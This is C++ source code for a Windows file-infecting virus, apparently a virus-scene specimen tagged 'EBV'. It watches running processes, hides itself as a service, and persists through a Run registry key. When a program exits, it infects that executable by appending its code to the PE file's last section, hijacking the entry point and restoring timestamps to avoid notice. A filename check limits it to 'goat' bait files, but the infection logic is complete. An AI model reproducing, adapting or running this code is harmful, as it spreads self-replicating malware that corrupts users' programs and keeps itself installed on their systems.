#include <windows.h>

extern "C" void entry_code_start();
extern "C" void entry_code_end();
extern int host_entry;
extern int size_of_main_file;

int virus_size_in_file;


/**** Taken from tlhelp32.h ************************************************/

#define TH32CS_SNAPPROCESS  0x00000002

typedef struct
{
    DWORD   dwSize;
    DWORD   cntUsage;
    DWORD   th32ProcessID;          // this process
    ULONG_PTR th32DefaultHeapID;
    DWORD   th32ModuleID;           // associated exe
    DWORD   cntThreads;
    DWORD   th32ParentProcessID;    // this process's parent process
    LONG    pcPriClassBase;         // Base priority of process's threads
    DWORD   dwFlags;
    CHAR    szExeFile[MAX_PATH];    // Path
} PROCESSENTRY32;


/**** Platform-dependant API declarations (are imported manually) **********/

typedef int (__stdcall *t_EnumProcesses) (int*, int, int*);
typedef int (__stdcall *t_EnumProcessModules) (HANDLE, HMODULE*, int, int*);
typedef int (__stdcall *t_GetModuleFileNameExA) (HANDLE, HMODULE, char*, int);
typedef HANDLE (__stdcall *t_CreateToolhelp32Snapshot) (int, int);
typedef int (__stdcall *t_Process32First) (HANDLE, PROCESSENTRY32*);
typedef int (__stdcall *t_Process32Next) (HANDLE, PROCESSENTRY32*);
typedef int (__stdcall *t_RegisterServiceProcess) (int, int);
t_EnumProcesses EnumProcesses;
t_EnumProcessModules EnumProcessModules;
t_GetModuleFileNameExA GetModuleFileNameExA;
t_CreateToolhelp32Snapshot CreateToolhelp32Snapshot;
t_Process32First Process32First;
t_Process32Next Process32Next;
t_RegisterServiceProcess RegisterServiceProcess;


/**** Linked list managment stuff ******************************************/

typedef struct _element
{
  struct _element *next;
  char filename[256];

} element, *element_ptr;


int in_list(element_ptr list, char filename[])
{
  while (list)
  {
    if (lstrcmp(list->filename, filename) == 0) return(1);
    list = list->next;
  };

  return(0);
};

void add(element_ptr &list, char filename[])
{
  element_ptr current_element = list;

  CharUpperA(filename);
  if (in_list(list, filename)) return;

  if (list == 0)
  {
    list = (element*) GlobalAlloc(GMEM_ZEROINIT, sizeof(element));
    lstrcpy(list->filename, filename);
  } else
  {
    while (current_element->next) current_element = current_element->next;
    current_element->next = (element*) GlobalAlloc(GMEM_ZEROINIT, sizeof(element));
    lstrcpy(current_element->next->filename, filename);
  };
};


void destroy_list(element_ptr list)
{
  element_ptr current_element;

  while (list)
  {
    current_element = list;
    list = list->next;
    GlobalFree((void*) current_element);
  };
};


/**** Process enumeration procedures for 9x and NT *************************/

void enumNT(element_ptr &list)
{
  int processIDs[256];
  int size;
  int i;
  int tmp;
  HANDLE processhandle;
  HMODULE modulehandle;
  char path[256];

  list = 0;

  if (EnumProcesses(processIDs, 256, &size))
  {
    for (i = 0; (i < (size / 4)); i++)
    {
      processhandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processIDs[i]);
      if (processhandle)
      {
        if (EnumProcessModules(processhandle, &modulehandle, 4, &tmp))
          if (GetModuleFileNameExA(processhandle, modulehandle, path, 256))
            add(list, path);

        CloseHandle(processhandle);
      };
    };
  };
};


void enum9x(element_ptr &list)
{
  PROCESSENTRY32 processentry;
  HANDLE snapshothandle;

  list = 0;

  snapshothandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

  if (snapshothandle != INVALID_HANDLE_VALUE)
  {
    processentry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshothandle, &processentry))
      do
        add(list, processentry.szExeFile);
      while (Process32Next(snapshothandle, &processentry));

    CloseHandle(snapshothandle);
  };
};


/**** Recreate dropper file layout from running process ********************/

void recreate_dropper_file()
{
  char *source, *dest;
  int sections;
  char *imagebase;
  IMAGE_NT_HEADERS *pe_header;
  IMAGE_SECTION_HEADER *section_header;
  unsigned int i;


  imagebase = (char*) GetModuleHandleA(0);
  pe_header = (IMAGE_NT_HEADERS*) (imagebase + ((IMAGE_DOS_HEADER*)imagebase)->e_lfanew);
  section_header = (IMAGE_SECTION_HEADER*) (((char*)pe_header) + 4 + sizeof(IMAGE_FILE_HEADER) + pe_header->FileHeader.SizeOfOptionalHeader);

  source = imagebase;
  dest = (char*) entry_code_end;
  for (i = 0; i < section_header[0].PointerToRawData; i++)
  {
    *dest = source[i];
    dest += 1;
  };

  for (sections = 0; sections < pe_header->FileHeader.NumberOfSections; sections++)
  {
    source = imagebase + section_header[sections].VirtualAddress;
    dest = (char*) entry_code_end + section_header[sections].PointerToRawData;

    for (i = 0; i < section_header[sections].SizeOfRawData; i++)
    {
      *dest = source[i];
      dest += 1;
    };
  };

  virus_size_in_file = dest - (char*) entry_code_start;
  size_of_main_file = dest - (char*) entry_code_end;
};


/**** Infect a PE EXE file *************************************************/

void infect(char filename[])
{
  if ( *((int*)&(filename[lstrlenA(filename) - 8])) != 'GOAT') return;

  int attributes;
  int filesize;
  FILETIME CreationTime, LastAccessTime, LastWriteTime;
  HANDLE filehandle, maphandle;
  char*mapbase;
  IMAGE_NT_HEADERS*pe_header;
  IMAGE_SECTION_HEADER*last_section_header;
  char *source, *dest;
  int i;

  attributes = GetFileAttributesA(filename);
  if (attributes != -1)
  {
    if (SetFileAttributesA(filename, FILE_ATTRIBUTE_NORMAL))
    {
      filehandle = CreateFileA(filename, GENERIC_READ|GENERIC_WRITE, 0, 0,
                               OPEN_EXISTING, 0, 0);

      if (filehandle != INVALID_HANDLE_VALUE)
      {
        if (GetFileTime(filehandle, &CreationTime, &LastAccessTime, &LastWriteTime))
        {
          if ((maphandle = CreateFileMapping(filehandle, 0, PAGE_READWRITE, 0,
                             (filesize = GetFileSize(filehandle, 0)) + 20000 , 0)) != 0)
          {
            if ((mapbase = (char*) MapViewOfFile(maphandle, FILE_MAP_ALL_ACCESS, 0, 0, 0)) != 0)
            {
              if ((((IMAGE_DOS_HEADER*)mapbase)->e_magic == 'MZ') &&
                  ((pe_header = (IMAGE_NT_HEADERS*) (mapbase + ((IMAGE_DOS_HEADER*)mapbase)->e_lfanew))->Signature == 'PE') &&
                  (pe_header->OptionalHeader.Magic == 0x10B) &&
                  (pe_header->FileHeader.Machine >= 0x14C) && (pe_header->FileHeader.Machine <= 0x14E) &&  // intel 386/486/Pentium machines
                  ((pe_header->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) != 0) &&
                  ((pe_header->FileHeader.Characteristics & (IMAGE_FILE_SYSTEM | IMAGE_FILE_DLL)) == 0) && // don't infect system files and dlls
                  ((pe_header->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_GUI) | (pe_header->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI)) &&
                  (pe_header->OptionalHeader.CheckSum != 'EBV'))
              {
                last_section_header = &((IMAGE_SECTION_HEADER*) (((char*)pe_header) + 4 + sizeof(IMAGE_FILE_HEADER) + pe_header->FileHeader.SizeOfOptionalHeader))[pe_header->FileHeader.NumberOfSections - 1];
                host_entry = pe_header->OptionalHeader.ImageBase + pe_header->OptionalHeader.AddressOfEntryPoint;
                pe_header->OptionalHeader.AddressOfEntryPoint = last_section_header->VirtualAddress + last_section_header->Misc.VirtualSize;
                pe_header->OptionalHeader.CheckSum = 'EBV';
                dest = mapbase + (last_section_header->PointerToRawData + last_section_header->Misc.VirtualSize);
                last_section_header->Misc.VirtualSize += virus_size_in_file;
                last_section_header->SizeOfRawData = ((last_section_header->Misc.VirtualSize / pe_header->OptionalHeader.FileAlignment) + 1) * pe_header->OptionalHeader.FileAlignment;
                last_section_header->Characteristics |= 0x0C0000000;
                filesize = last_section_header->SizeOfRawData + last_section_header->PointerToRawData;
                pe_header->OptionalHeader.SizeOfImage = (((last_section_header->VirtualAddress + last_section_header->Misc.VirtualSize) / pe_header->OptionalHeader.SectionAlignment) + 1) * pe_header->OptionalHeader.SectionAlignment;

                source = (char*) entry_code_start;
                for (i = 0; i < virus_size_in_file; i++) dest[i] = source[i];
              };

              UnmapViewOfFile(mapbase);
            };

            CloseHandle(maphandle);
            SetFilePointer(filehandle, filesize, 0, FILE_BEGIN);
            SetEndOfFile(filehandle);
          };

          SetFileTime(filehandle, &CreationTime, &LastAccessTime, &LastWriteTime);
        };

        CloseHandle(filehandle);
      };

      SetFileAttributes(filename, attributes);
    };
  };
};


/**** Entrypoint of main virus executable **********************************/

void main()
{
  HMODULE psapi, kernel32;

  void (*enum32) (element_ptr &);

  element_ptr filenames1;
  element_ptr filenames2;
  element_ptr current_element;

  HKEY handle;
  char filename[256];

  MSG msg;


  enum32 = 0;

  if ((psapi = LoadLibraryA("PSAPI.DLL")) != 0)
    if (((EnumProcesses = (t_EnumProcesses) GetProcAddress(psapi, "EnumProcesses")) != 0) &&
        ((EnumProcessModules = (t_EnumProcessModules) GetProcAddress (psapi, "EnumProcessModules")) != 0) &&
        ((GetModuleFileNameExA = (t_GetModuleFileNameExA) GetProcAddress (psapi, "GetModuleFileNameExA")) != 0))
                enum32 = enumNT;

  if ((kernel32 = GetModuleHandleA("KERNEL32.DLL")) != 0)
    if (((CreateToolhelp32Snapshot = (t_CreateToolhelp32Snapshot) GetProcAddress(kernel32, "CreateToolhelp32Snapshot")) != 0) &&
        ((Process32First = (t_Process32First) GetProcAddress (kernel32, "Process32First")) != 0) &&
        ((Process32Next = (t_Process32Next) GetProcAddress (kernel32, "Process32Next")) != 0))
                enum32 = enum9x;

  if (enum32 == 0) return;


  PeekMessage(&msg, 0, 0, 1, 0);        /* avoid the hourglass icon */

  if ((RegisterServiceProcess = (t_RegisterServiceProcess) GetProcAddress (kernel32, "RegisterServiceProcess")) != 0)
    RegisterServiceProcess(0, 1);

  GetModuleFileName(0, filename, 250);
  if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &handle) == ERROR_SUCCESS)
  {
    RegSetValueEx(handle, "EBV", 0, REG_SZ, filename, lstrlen(filename)+1);
    RegCloseKey(handle);
  };


  recreate_dropper_file();

  enum32(filenames1);

  while(1)
  {
    Sleep(50);
    enum32(filenames2);

    for (current_element = filenames1; current_element != 0; current_element = current_element->next)
      if (!in_list(filenames2, current_element->filename)) infect(current_element->filename);

    destroy_list(filenames1);
    filenames1 = filenames2;
  };
};
